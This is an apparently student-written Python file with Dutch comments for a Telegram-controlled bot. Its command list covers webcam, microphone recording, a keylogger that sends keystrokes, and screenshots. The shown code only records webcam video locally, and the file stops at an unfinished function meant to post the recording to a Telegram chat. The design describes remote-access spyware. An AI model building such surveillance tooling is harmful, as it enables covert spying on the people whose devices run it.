import cv2
import os

# deze file bevat alle functies die aangeroepen worden wanneer een command uitgevoerd wordt

# functie die afgedraaid wordt om de banner te maken
def get_banner() -> str:
    """
    Geeft de ASCII banner terug als string.
    """
    return r"""
  ___               _             
 | _ \_  _ _ _ _ __| |___         
 |  _/ || | '_| '_ \ / -_)        
 |_|  \_,_|_| | .__/_\___|        
  __  __ _    |_|                 
 |  \/  (_)__| | |_ ___ _ _ _ __  
 | |\/| | / _` |  _/ -_) '_| '  \ 
 |_|  |_|_\__,_|\__\___|_| |_|_|_|

=================================
Viresh & Muazma
=================================
"""

# functie die een lijst met alle commands terug geeft
def get_command_list() -> str:
    """
    Geeft een lijst met alle slash commands.
    """
    return r"""
Command Lijst:
/banner        -   ASCII art banner
/webcam      -   opent de webcam
/microfoon   -   maakt luisterbestand
/keylogger    -   stuurt toetsenbordkeys op
/screenshot  -   maakt een screenshot
"""

# maak een video recording met de webcam
# source: https://www.geeksforgeeks.org/python/python-opencv-capture-video-from-camera/
def get_camRecording():
    # folder waar de video opgeslagen wordt
    save_dir = './videos'
    os.makedirs(save_dir, exist_ok=True)

    # Bestandsnaam en opslagpad aangeven
    filename = 'output.mp4'
    filepath = os.path.join(save_dir, filename)

    # videoCapture functie: aangeven dat de webcam gebruikt moet/kan worden (camera met index 0)
    cam = cv2.VideoCapture(0)

    # melden en functie stoppen als camera niet geopend kan worden
    if not cam.isOpened():
        return print("Camera kan niet geopend worden!")

    # height en width van de video bepalen
    frame_width = int(cam.get(cv2.CAP_PROP_FRAME_WIDTH))
    frame_height = int(cam.get(cv2.CAP_PROP_FRAME_HEIGHT))

    # VideoWriter object aanmaken om de opname als mp4 op te slaan in de filepath=/video folder
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter(filepath, fourcc, 20.0, (frame_width, frame_height))

    # zolang de whileloop true is wordt webcam gebruikt om video te maken
    while True:
        ret, frame = cam.read()

        out.write(frame)
        cv2.imshow('Camera', frame)

        # als q geklikt wordt beindig video
        if cv2.waitKey(1) == ord('q'):
            break

    # als de loop stopt de camera opname afsluiten
    cam.release()
    out.release()
    cv2.destroyAllWindows()

# verstuur een video naar de telegram chat
def post_camrecording():
